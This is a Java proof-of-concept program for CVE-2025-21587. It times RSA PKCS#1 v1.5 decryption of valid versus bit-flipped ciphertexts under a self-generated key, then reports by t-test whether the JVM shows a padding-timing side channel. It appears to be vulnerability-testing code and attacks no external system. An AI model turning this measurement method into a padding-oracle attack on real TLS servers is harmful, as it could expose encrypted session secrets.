import javax.crypto.Cipher;
import javax.crypto.BadPaddingException;
import java.security.*;
import java.security.interfaces.RSAPublicKey;
import java.util.*;

/**
 * Proof of Concept for CVE-2025-21587
 *
 * Tests timing side-channel in RSA PKCS#1 v1.5 padding validation.
 * The vulnerability allows distinguishing valid from invalid padding through timing.
 *
 * Attack: Measure RSA decryption time for valid vs corrupted ciphertexts
 * Vulnerable: java-11-openjdk 11.0.26 shows timing differences
 * Fixed: java-11-openjdk 11.0.27 has constant-time padding validation
 */
public class TimingAttackPoC {

    private static final int RSA_KEY_SIZE = 2048;
    private static final int NUM_SAMPLES = 1000;
    private static final int WARMUP_ITERATIONS = 100;

    private KeyPair keyPair;
    private PublicKey publicKey;
    private PrivateKey privateKey;

    public TimingAttackPoC() throws Exception {
        generateKeyPair();
    }

    private void generateKeyPair() throws Exception {
        System.out.println("[*] Generating RSA-2048 key pair...");
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(RSA_KEY_SIZE);
        keyPair = kpg.generateKeyPair();
        publicKey = keyPair.getPublic();
        privateKey = keyPair.getPrivate();
        System.out.println("[+] Key pair generated successfully\n");
    }

    /**
     * Encrypt plaintext using RSA with PKCS#1 v1.5 padding
     */
    private byte[] encrypt(byte[] plaintext) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(plaintext);
    }

    /**
     * Corrupt ciphertext by flipping random bits to create invalid padding
     */
    private byte[] corruptCiphertext(byte[] ciphertext) {
        byte[] corrupted = Arrays.copyOf(ciphertext, ciphertext.length);
        SecureRandom random = new SecureRandom();

        // Flip 1-3 random bits to corrupt padding
        int numBitsToFlip = 1 + random.nextInt(3);
        for (int i = 0; i < numBitsToFlip; i++) {
            int byteIndex = random.nextInt(corrupted.length);
            int bitIndex = random.nextInt(8);
            corrupted[byteIndex] ^= (1 << bitIndex);
        }

        return corrupted;
    }

    /**
     * Measure decryption time
     * Returns time in nanoseconds, or -1 if decryption succeeds (should not happen for corrupted)
     */
    private long measureDecryptionTime(byte[] ciphertext) {
        try {
            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.DECRYPT_MODE, privateKey);

            long startTime = System.nanoTime();
            try {
                cipher.doFinal(ciphertext);
                // If decryption succeeds, this is a valid ciphertext
                return -1;
            } catch (BadPaddingException e) {
                // Expected for corrupted ciphertexts
                long endTime = System.nanoTime();
                return endTime - startTime;
            }
        } catch (Exception e) {
            return -1;
        }
    }

    /**
     * Run timing attack
     */
    public void runTimingAttack() throws Exception {
        System.out.println("=".repeat(70));
        System.out.println("CVE-2025-21587 Timing Attack PoC");
        System.out.println("=".repeat(70));
        System.out.println();

        // Create a 48-byte TLS pre-master secret
        byte[] preMasterSecret = new byte[48];
        preMasterSecret[0] = 0x03; // TLS version 1.2
        preMasterSecret[1] = 0x03;
        SecureRandom random = new SecureRandom();
        for (int i = 2; i < 48; i++) {
            preMasterSecret[i] = (byte) random.nextInt(256);
        }

        // Warmup JVM
        System.out.println("[*] Warming up JVM (" + WARMUP_ITERATIONS + " iterations)...");
        for (int i = 0; i < WARMUP_ITERATIONS; i++) {
            byte[] validCipher = encrypt(preMasterSecret);
            measureDecryptionTime(validCipher);

            byte[] corruptedCipher = corruptCiphertext(validCipher);
            measureDecryptionTime(corruptedCipher);
        }
        System.out.println("[+] Warmup complete\n");

        // Collect timing samples for VALID ciphertexts (will decrypt successfully)
        System.out.println("[*] Collecting timing for VALID ciphertexts...");
        System.out.println("    (These decrypt successfully, so we measure encrypt+decrypt time)");

        List<Long> validTimings = new ArrayList<>();
        for (int i = 0; i < NUM_SAMPLES; i++) {
            byte[] validCipher = encrypt(preMasterSecret);

            // Measure time to decrypt valid ciphertext
            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.DECRYPT_MODE, privateKey);

            long startTime = System.nanoTime();
            try {
                cipher.doFinal(validCipher);
                long endTime = System.nanoTime();
                validTimings.add(endTime - startTime);
            } catch (Exception e) {
                // Should not happen for valid ciphertext
            }

            if ((i + 1) % 100 == 0) {
                System.out.println("      Progress: " + (i + 1) + "/" + NUM_SAMPLES);
            }
        }

        // Collect timing samples for CORRUPTED ciphertexts (invalid padding)
        System.out.println("\n[*] Collecting timing for CORRUPTED ciphertexts...");
        System.out.println("    (These have invalid padding, throw BadPaddingException)");

        List<Long> corruptedTimings = new ArrayList<>();
        for (int i = 0; i < NUM_SAMPLES; i++) {
            byte[] validCipher = encrypt(preMasterSecret);
            byte[] corruptedCipher = corruptCiphertext(validCipher);

            long time = measureDecryptionTime(corruptedCipher);
            if (time > 0) {
                corruptedTimings.add(time);
            }

            if ((i + 1) % 100 == 0) {
                System.out.println("      Progress: " + (i + 1) + "/" + NUM_SAMPLES);
            }
        }

        // Statistical analysis
        System.out.println("\n" + "=".repeat(70));
        System.out.println("RESULTS");
        System.out.println("=".repeat(70));

        double validMean = calculateMean(validTimings);
        double validStdDev = calculateStdDev(validTimings, validMean);
        double corruptedMean = calculateMean(corruptedTimings);
        double corruptedStdDev = calculateStdDev(corruptedTimings, corruptedMean);

        System.out.println("\nValid Ciphertext Decryption:");
        System.out.println("  Samples:  " + validTimings.size());
        System.out.println("  Mean:     " + String.format("%.2f", validMean) + " ns");
        System.out.println("  Std Dev:  " + String.format("%.2f", validStdDev) + " ns");
        System.out.println("  Min:      " + Collections.min(validTimings) + " ns");
        System.out.println("  Max:      " + Collections.max(validTimings) + " ns");

        System.out.println("\nCorrupted Ciphertext Decryption (Invalid Padding):");
        System.out.println("  Samples:  " + corruptedTimings.size());
        System.out.println("  Mean:     " + String.format("%.2f", corruptedMean) + " ns");
        System.out.println("  Std Dev:  " + String.format("%.2f", corruptedStdDev) + " ns");
        System.out.println("  Min:      " + Collections.min(corruptedTimings) + " ns");
        System.out.println("  Max:      " + Collections.max(corruptedTimings) + " ns");

        // Calculate timing difference
        double timingDiff = Math.abs(validMean - corruptedMean);
        double timingDiffPercent = (timingDiff / Math.max(validMean, corruptedMean)) * 100;

        System.out.println("\n" + "-".repeat(70));
        System.out.println("Timing Difference Analysis:");
        System.out.println("  Absolute: " + String.format("%.2f", timingDiff) + " ns");
        System.out.println("  Relative: " + String.format("%.2f", timingDiffPercent) + "%");

        // T-test
        double tStatistic = calculateTStatistic(validTimings, corruptedTimings, validMean, corruptedMean);
        System.out.println("  T-statistic: " + String.format("%.4f", tStatistic));

        // Verdict
        System.out.println("\n" + "=".repeat(70));
        System.out.println("VULNERABILITY ASSESSMENT");
        System.out.println("=".repeat(70));

        if (Math.abs(tStatistic) > 2.576) {
            System.out.println("\nWARNING  VULNERABLE: Statistically significant timing difference detected!");
            System.out.println("    The implementation appears to be vulnerable to CVE-2025-21587.");
            System.out.println("    An attacker could exploit this timing side-channel to perform");
            System.out.println("    a Bleichenbacher-style padding oracle attack.");
        } else if (Math.abs(tStatistic) > 1.96) {
            System.out.println("\nWARNING  POSSIBLY VULNERABLE: Timing difference detected (95% confidence)");
            System.out.println("    Further testing recommended.");
        } else {
            System.out.println("\nOK NOT VULNERABLE: No statistically significant timing difference.");
            System.out.println("    The constant-time implementation appears to be working correctly.");
        }

        System.out.println("\n" + "=".repeat(70));
    }

    private double calculateMean(List<Long> values) {
        return values.stream().mapToLong(Long::longValue).average().orElse(0.0);
    }

    private double calculateStdDev(List<Long> values, double mean) {
        double variance = values.stream()
            .mapToDouble(v -> Math.pow(v - mean, 2))
            .average()
            .orElse(0.0);
        return Math.sqrt(variance);
    }

    private double calculateTStatistic(List<Long> sample1, List<Long> sample2,
                                       double mean1, double mean2) {
        double stdDev1 = calculateStdDev(sample1, mean1);
        double stdDev2 = calculateStdDev(sample2, mean2);

        int n1 = sample1.size();
        int n2 = sample2.size();

        double pooledStdDev = Math.sqrt(
            (stdDev1 * stdDev1 / n1) + (stdDev2 * stdDev2 / n2)
        );

        return (mean1 - mean2) / pooledStdDev;
    }

    public static void main(String[] args) {
        try {
            System.out.println("+==============================================================+");
            System.out.println("|         CVE-2025-21587 Proof of Concept                      |");
            System.out.println("|         Timing Side-Channel in RSA PKCS#1 v1.5              |");
            System.out.println("+==============================================================+");
            System.out.println("\nJava Version: " + System.getProperty("java.version"));
            System.out.println("JVM Vendor:   " + System.getProperty("java.vendor"));
            System.out.println("JVM Name:     " + System.getProperty("java.vm.name"));
            System.out.println();

            TimingAttackPoC poc = new TimingAttackPoC();
            poc.runTimingAttack();

        } catch (Exception e) {
            System.err.println("\nError running PoC:");
            e.printStackTrace();
            System.exit(1);
        }
    }
}
